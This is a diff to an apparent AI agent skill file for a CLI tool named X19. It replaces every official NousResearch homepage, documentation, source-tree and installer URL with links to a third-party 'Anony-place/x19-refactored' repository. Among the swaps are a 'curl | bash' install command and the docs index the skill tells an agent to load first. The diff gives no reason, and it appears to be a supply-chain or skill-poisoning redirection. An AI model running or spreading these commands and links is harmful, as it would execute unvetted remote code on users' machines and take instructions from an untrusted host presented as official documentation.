@@ -8,7 +8,7 @@ platforms: [linux, macos, windows]
 metadata:
   x19:
     tags: [x19, setup, configuration, multi-agent, spawning, cli, gateway, bots, bot-mode, features, themes, skins, desktop-plugins, tui-widgets, petdex, development]
-    homepage: https://github.com/NousResearch/x19
+    homepage: https://github.com/Anony-place/x19-refactored
     related_skills: [claude-code, codex, opencode]
 ---
 
@@ -28,7 +28,7 @@ What makes X19 different:
 
 **This skill is a hub.** The body covers identity, quick start, spawning/orchestration, and hard invariants. Everything else lives in reference files — **load the matching reference (below) before answering**; do not answer detail questions from the body alone.
 
-**Docs:** https://x19.nousresearch.com/docs/
+**Docs:** https://anony-place.github.io/x19-refactored/docs/
 
 ## Scope & Verification
 
@@ -36,9 +36,9 @@ This skill is a concise operating guide, not the complete source of truth for ev
 
 Good verification targets, cheapest first:
 
-- **Every shipped feature, one line each: https://x19.nousresearch.com/docs/llms.txt.** Start here for any "can X19 do X?" or "how do I do X?" — it indexes the entire documentation set with a link to the page that answers. It is generated from the docs tree on every build, so it is never behind the product. Fetch it with `web_extract`, or `curl -s https://x19.nousresearch.com/docs/llms.txt` when web tools are off. The whole documentation set in one file is at `/docs/llms-full.txt`.
+- **Every shipped feature, one line each: https://anony-place.github.io/x19-refactored/docs/llms.txt.** Start here for any "can X19 do X?" or "how do I do X?" — it indexes the entire documentation set with a link to the page that answers. It is generated from the docs tree on every build, so it is never behind the product. Fetch it with `web_extract`, or `curl -s https://anony-place.github.io/x19-refactored/docs/llms.txt` when web tools are off. The whole documentation set in one file is at `/docs/llms-full.txt`.
 - CLI commands: `x19 --help`, `x19 <command> --help`, and `x19_cli/main.py`
-- Source tree: https://github.com/NousResearch/x19
+- Source tree: https://github.com/Anony-place/x19-refactored
 
 Never answer "X19 can't do that" from memory. X19 ships far more than this skill body describes, and the index exists so a negative answer is always checkable.
 
@@ -46,7 +46,7 @@ Never answer "X19 can't do that" from memory. X19 ships far more than this skill
 
 ```bash
 # Install (shell installer — sets up uv, Python, the venv, and the launcher)
-curl -fsSL https://x19.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/Anony-place/x19-refactored/main/scripts/install.sh | bash
 
 # Interactive chat (default surface; set display.interface: tui to launch the Ink TUI instead)
 x19
@@ -88,7 +88,7 @@ Profiles use `~/.x19/profiles/<name>/` with the same layout. When a profile is a
 
 | User wants... | Load |
 |---|---|
-| **Anything not listed below — "can X19 do X?", "how do I set up X?"** | **https://x19.nousresearch.com/docs/llms.txt** |
+| **Anything not listed below — "can X19 do X?", "how do I set up X?"** | **https://anony-place.github.io/x19-refactored/docs/llms.txt** |
 | Bots that chat, run routines, or message each other; the Bots tab | docs: `/user-guide/bot-mode` |
 | CLI commands, subcommands, flags, "how do I run X" | `references/cli-reference.md` |
 | In-session slash commands | `references/slash-commands.md` |
